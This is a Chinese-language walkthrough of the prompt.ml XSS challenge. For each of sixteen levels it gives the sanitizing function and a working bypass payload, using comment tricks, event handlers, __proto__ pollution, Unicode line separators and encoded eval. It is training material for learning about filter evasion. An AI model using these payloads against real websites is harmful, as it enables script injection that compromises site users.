# prompt(1) to win



<a rel="noreferrer noopener" href="http://prompt.ml" target="_blank" rel="nofollow" >http://prompt.ml</a>

<div class="has-toc have-toc">
</div>

## 0x00

<pre class="wp-block-code"><code>function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '&lt;input type="text" value="' + input + '">';
}        </code></pre>

简单闭合下，构造`"><script>prompt(1);</script>`

## 0x01

<pre class="wp-block-code"><code>function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /&lt;\/?&#91;^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '&lt;article>' + input + '&lt;/article>';
}   </code></pre>

可以用换行或者注释绕过，构造`<svg/onload=prompt(1)//`<figure class="wp-block-image size-full">

<img loading="lazy" width="471" height="145" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-176.png" alt="" class="wp-image-2922" /> </figure> 

## 0x02

<pre class="wp-block-code"><code>function escape(input) {
    //                      v-- frowny face
    input = input.replace(/&#91;=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}  </code></pre>

可以构造如下的payload：

<pre class="wp-block-code"><code>&lt;script>eval.call`${'prompt\x281)'}`&lt;/script> 
&lt;script>prompt.call`${1}`&lt;/script>
&lt;svg>&lt;script>prompt&#40;1)&lt;/script>
......</code></pre>

## 0x03

<pre class="wp-block-code"><code>function escape(input) {
    // filter potential comment end delimiters
    input = input.replace(/->/g, '_');

    // comment the input to avoid script execution
    return '&lt;!-- ' + input + ' -->';
}    </code></pre>

绕过闭合注释，`--!><svg/onload=prompt(1)>`

## 0x04

<pre class="wp-block-code"><code>function escape(input) {
    // make sure the script belongs to own site
    // sample script: http://prompt.ml/js/test.js
    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {
        var script = document.createElement('script');
        script.src = input;
        return script.outerHTML;
    } else {
        return 'Invalid resource.';
    }
} </code></pre>

在本地将`prompt(1)`写入1.js，/ 是不允许的。考虑到这里的正则特性和decodeURIComponent函数，所以可以使用%2f绕过。最后构造`http://prompt.ml/@localhost/1.js`

## 0x05

<pre class="wp-block-code"><code>function escape(input) {
    // apply strict filter rules of level 0
    // filter ">" and event handlers
    input = input.replace(/>|on.+?=|focus/gi, '_');

    return '&lt;input value="' + input + '" type="text">';
}   </code></pre>

构造如下payload

<pre class="wp-block-code"><code>" type="image" src=# onerror
=prompt(1) "</code></pre>

## 0x06

<pre class="wp-block-code"><code>function escape(input) {
    // let's do a post redirection
    try {
        // pass in formURL#formDataJSON
        // e.g. http://httpbin.org/post#{"name":"Matt"}
        var segments = input.split('#');
        var formURL = segments&#91;0];
        var formData = JSON.parse(segments&#91;1]);

        var form = document.createElement('form');
        form.action = formURL;
        form.method = 'post';
    
        for (var i in formData) {
            var input = form.appendChild(document.createElement('input'));
            input.name = i;
            input.setAttribute('value', formData&#91;i]);
        }
    
        return form.outerHTML + '                         \n\
&lt;script>                                                  \n\
    // forbid javascript: or vbscript: and data: stuff    \n\
    if (!/script:|data:/i.test(document.forms&#91;0].action)) \n\
        document.forms&#91;0].submit();                       \n\
    else                                                  \n\
        document.write("Action forbidden.")               \n\
&lt;/script>                                                 \n\
        ';
    } catch (e) {
        return 'Invalid form data.';
    }
}  </code></pre>

先输入范例，查看下效果<figure class="wp-block-image size-full">

<img loading="lazy" width="933" height="410" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-177.png" alt="" class="wp-image-2927" /> </figure> 

这道题是考察表单提交action过滤，这里参考大佬们的答案进行整理。题目构造post表单，我们需要输入的格式为formURL#formDataJSON，具体过程是先提取formURL构造form表单，formURL赋值给form标签中的action，然后post内容构造input标签。

想嵌入代码，经常能见到类似action=”javascript:alert(1)”的内容，但是后面还过滤了document.form[0].action内容，过滤了script和data字符。

但是过滤存在缺陷，由于存在子级tag，action 将会优先指向name为action的子tag。所以我们在构造payload时，可以将input标签的name属性值设置为action，这样document.form[0].action指向的就不是form标签中的action了，因此过滤也就不起作用了。payload：`javascript:prompt(1)#{"action":"Matt"}`

## 0x07

<pre class="wp-block-code"><code>function escape(input) {
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');
    return segments.map(function(title) {
        // title can only contain 12 characters
        return '&lt;p class="comment" title="' + title.slice(0, 12) + '">&lt;/p>';
    }).join('\n');
}        </code></pre>

字符按照#分离，每一部分赋给一个`title`，如果超过12字符，就截取前12个。可以使用注释绕过长度限制,:

<pre class="wp-block-code"><code>">&lt;script>/*#*/prompt(1/*#*/)&lt;/script>

">&lt;svg/a=#"onload='/*#*/prompt(1)'</code></pre>

## 0x08

<pre class="wp-block-code"><code>function escape(input) {
    // prevent input from getting out of comment
    // strip off line-breaks and stuff
    input = input.replace(/&#91;\r\n&lt;/"]/g, '');

    return '                                \n\
&lt;script>                                    \n\
    // console.log("' + input + '");        \n\
&lt;/script> ';
}        </code></pre>

过滤了两个换行符，所以需要一个特殊的编码技巧：

<pre class="wp-block-code"><code>U+2028，是Unicode中的行分隔符。
U+2029，是Unicode中的段落分隔符。
--> 在 js 中可当注释使用</code></pre>

在console中输入：`'\u2028prompt(1)\u2028-->'`或者 `'\u2029prompt(1)\u2029-->'` 输出的结果就是payload。<figure class="wp-block-image size-full">

<img loading="lazy" width="363" height="108" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-178.png" alt="" class="wp-image-2935" /> </figure> 

## 0x09

<pre class="wp-block-code"><code>function escape(input) {
    // filter potential start-tags
    input = input.replace(/&lt;(&#91;a-zA-Z])/g, '&lt;_$1');
    // use all-caps for heading
    input = input.toUpperCase();

    // sample input: you shall not pass! => YOU SHALL NOT PASS!
    return '&lt;h1>' + input + '&lt;/h1>';
}    </code></pre>

思路之前在XSS弹窗挑战里说过，给个payload，`<ſcript/src="http://127.0.0.1/1.js">`

## 0x0A

<pre class="wp-block-code"><code>function escape(input) {
    // (╯°□°）╯︵ ┻━┻
    input = encodeURIComponent(input).replace(/prompt/g, 'alert');
    // ┬──┬ ノ( ゜-゜ノ) chill out bro
    input = input.replace(/'/g, '');

    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
    return '&lt;script>' + input + '&lt;/script> ';
}      </code></pre>

encodeURIComponent()不会对 ASCII 字母和数字进行编码，也不会对这些 ASCII 标点符号进行编码： - _ . ! ~ * ' ( ) 。其他字符（比如：;/?:@&=+$,# 这些用于分隔 URI 组件的标点符号），都是由一个或多个十六进制的转义序列替换的。且过滤单引号，可以考虑构造`p'rompt(1)`

## 0x0B

<pre class="wp-block-code"><code>function escape(input) {
    // name should not contain special characters
    var memberName = input.replace(/&#91;&#91;|\s+*/\\&lt;>&^:;=~!%-]/g, '');

    // data to be parsed as JSON
    var dataString = '{"action":"login","message":"Welcome back, ' + memberName + '."}';
    
    // directly "parse" data in script context
    return '                                \n\
&lt;script>                                    \n\
    var data = ' + dataString + ';          \n\
    if (data.action === "login")            \n\
        document.write(data.message)        \n\
&lt;/script> ';
}     </code></pre>

在js中，`(prompt(1))instanceof"1"`和 `(prompt(1))in"1"` 是可以成功弹窗的，其中双引号里面的1可以是任何字符，这里的in或者instanceof是运算符，所以可以有这样的语法结构。

<pre class="wp-block-code"><code>"(prompt(1))in"
"(prompt(1))instanceof"</code></pre>

补充一个知识点，`"1"(alert(1))`虽然会提示语法错误， 但是还是会执行js语句弹框。(和浏览器有关)

## 0x0C

<pre class="wp-block-code"><code>function escape(input) {
    // in Soviet Russia...
    input = encodeURIComponent(input).replace(/'/g, '');
    // table flips you!
    input = input.replace(/prompt/g, 'alert');

    // ノ┬─┬ノ ︵ ( \o°o)\
    return '&lt;script>' + input + '&lt;/script> ';
}        </code></pre>

`parseInt()`可以将字符串转数字，语法`parseInt(<em>string</em>, <em>radix</em>)`。

| 字段   | 含义                                                         |
| ------ | ------------------------------------------------------------ |
| string | 必需。要被解析的字符串。                                     |
| radix  | 可选。表示要解析的数字的基数。该值介于 2 ~ 36 之间。 如果省略该参数或其值为 0，则数字将以 10 为基础来解析。如果它以 “0x” 或 “0X” 开头，将以 16 为基数。 如果该参数小于 2 或者大于 36，则 parseInt() 将返回 NaN。 |

`toString()`也有一个可选参数radix，找一个足够大的基数来包含所需的所有字符，就可以将字符串编码为一个数字，然后`eval`转换的结果（数字>字符串）。<figure class="wp-block-image size-full">

<img loading="lazy" width="245" height="100" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-179.png" alt="" class="wp-image-2945" /> </figure> 

可以构造如下payload:

```
eval((1558153217).toString(36))(1)

eval((1172936279).toString(34).concat(String.fromCharCode(40)).concat(1).concat(String.fromCharCode(41)))
解释:concat连接，String.fromCharCode(40)->(， String.fromCharCode(41)->)

eval((25).toString(30).concat(String.fromCharCode(114)).concat(String.fromCharCode(111)).concat(String.fromCharCode(109)).concat(String.fromCharCode(112)).concat(String.fromCharCode(116)).concat(String.fromCharCode(40)).concat(1).concat(String.fromCharCode(41)))
```

## 0x0D

<pre class="wp-block-code"><code> function escape(input) {
    // extend method from Underscore library
    // _.extend(destination, *sources) 
    function extend(obj) {
        var source, prop;
        for (var i = 1, length = arguments.length; i &lt; length; i++) {
            source = arguments&#91;i];
            for (prop in source) {
                obj&#91;prop] = source&#91;prop];
            }
        }
        return obj;
    }
    // a simple picture plugin
    try {
        // pass in something like {"source":"http://sandbox.prompt.ml/PROMPT.JPG"}
        var data = JSON.parse(input);
        var config = extend({
            // default image source
            source: 'http://placehold.it/350x150'
        }, JSON.parse(input));
        // forbit invalid image source
        if (/&#91;^\w:\/.]/.test(config.source)) {
            delete config.source;
        }
        // purify the source by stripping off "
        var source = config.source.replace(/"/g, '');
        // insert the content using mustache-ish template
        return '&lt;img src="{{source}}">'.replace('{{source}}', source);
    } catch (e) {
        return 'Invalid image data.';
    }
}    </code></pre>

我太菜了，这题没有思路解，看了下大佬的博客，现在复现下。JSON.parse()函数要接受一个json格式的字符串返回json格式的对象，如果传入的参数已经是json格式则会抛出异常，传入的参数被解析成json格式，格式不对则直接返回Invalid image data.，再经由extend()函数处理，extend()函数把默认值替换为指定的值后返回，然后是一个正则判断source对应的值中是否有不属于url的符号，有则删去这个值，将source属性删除。

每个对象都会在其内部初始化一个属性，就是proto，当我们访问对象的属性时，如果对象内部不存在这个属性，那么就会去proto里面找这个属性。

原理测试`test={"source":1,"__proto__":{"source":2}}`：<figure class="wp-block-image size-full">

<img loading="lazy" width="346" height="204" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-181.png" alt="" class="wp-image-2949" /> </figure> 

那么基本上就是构造`{"source":"'","proto":{"source":"onerror=prompt(1)"}}`,由于前面有非法字符'，则会删除，但是在替换的时候由于过滤了",无法闭合，那么需要利用replace的一个特性。<figure class="wp-block-image">

![][1] </figure> 

<pre class="wp-block-code"><code>'1234567890'.replace('3',"han")
"12han4567890"

'1234567890'.replace('3',"$&han")
"123han4567890"

'1234567890'.replace('3',"$`han")
"1212han4567890"

'1234567890'.replace('3',"$'han")
"124567890han4567890"

'1234567890'.replace('3',"$$han")
"12$han4567890"</code></pre>

最后构造payload``{"source":"'"," proto": {"source":"$`onerror=prompt(1)>"}}``

## 0x0E

<pre class="wp-block-code"><code>function escape(input) {
    // I expect this one will have other solutions, so be creative :)
    // mspaint makes all file names in all-caps :(
    // too lazy to convert them back in lower case
    // sample input: prompt.jpg => PROMPT.JPG
    input = input.toUpperCase();
    // only allows images loaded from own host or data URI scheme
    input = input.replace(/\/\/|\w+:/g, 'data:');
    // miscellaneous filtering
    input = input.replace(/&#91;\\&+%\s]|vbs/gi, '_');

    return '&lt;img src="' + input + '">';
}  </code></pre>

函数先把输入转换为大写，第二层将//和字母换为data:，第三层将\、&、+、%和空白字符，vbs替换为_，所以不能内嵌编码后的字符，由于js大小写敏感，所以只能引用外部脚本。

Data URI是由RFC 2397定义的一种把小文件直接嵌入文档的方案。格式如下：

<pre class="wp-block-code"><code>data:&#91;&lt;MIME type>]&#91;;charset=&lt;charset>]&#91;;base64],&lt;encoded data></code></pre>

其实整体可以视为三部分，即声明：参数+数据，逗号左边的是各种参数，右边的是数据。

MIME type，表示数据呈现的格式，即指定嵌入数据的MIME。

  * 1、对于PNG的图片，其格式是image/png，如果没有指定，默认是text/plain。
  * 2、character set(字符集）大多数被忽略，默认是charset=US-ASCII。如果指定是的数据格式是图片时，字符集将不再使用。
  * 3、base64，这一部分将表明其数据的编码方式，此处为声明后面的数据的编码是base64，我们可以不必使用base64编码格式，如果那样，我们将使用标准的URL编码方式,形如%XX%XX%XX的格式。

一个data URI范例：

<pre class="wp-block-code"><code>&lt;a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4="&gt;test&lt;a&gt;</code></pre>

这道题目有问题，并不能复现成功，参考payload：`"><IFRAME/SRC="x:text/html;base64,ICA8U0NSSVBUIC8KU1JDCSA9SFRUUFM6UE1UMS5NTD4JPC9TQ1JJUFQJPD4=`

## 0x0F

```
function escape(input) {
    // sort of spoiler of level 7
    input = input.replace(/\*/g, '');
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');

    return segments.map(function(title, index) {
        // title can only contain 15 characters
        return '<p class="comment" title="' + title.slice(0, 15) + '" data-comment=\'{"id":'
        + index + '}\'></p>';
    }).join('\n');
}  
```

7的加强版，会过滤掉*。可以用`<svg>`标签构造关于<!\---->的注释。

<pre class="wp-block-code"><code>">&lt;svg>&lt;!--#-->&lt;script>&lt;!--#-->prompt(1&lt;!--#-->)&lt;/script>

">&lt;svg>&lt;!--#-->&lt;script>&lt;!--#-->prompt(1)&lt;/</code></pre>

模板字符串 知识点：  
1.反撇号字符 \` 代替普通字符串的引号 ' 或 "，提供了字符串插值功能。  
2.`${x}`被称为模板占位符，JavaScript 将把 x 的值插入到最终生成的字符串中，也就是说\`abcd${alert(1)}efgh\`是可以正常执行的。

<pre class="wp-block-code"><code>">&lt;script>`#${prompt(1)}#`&lt;/script></code></pre>

[1]: https://xzfile.aliyuncs.com/media/upload/picture/20190326141703-c618e428-4f8e-1.jpg
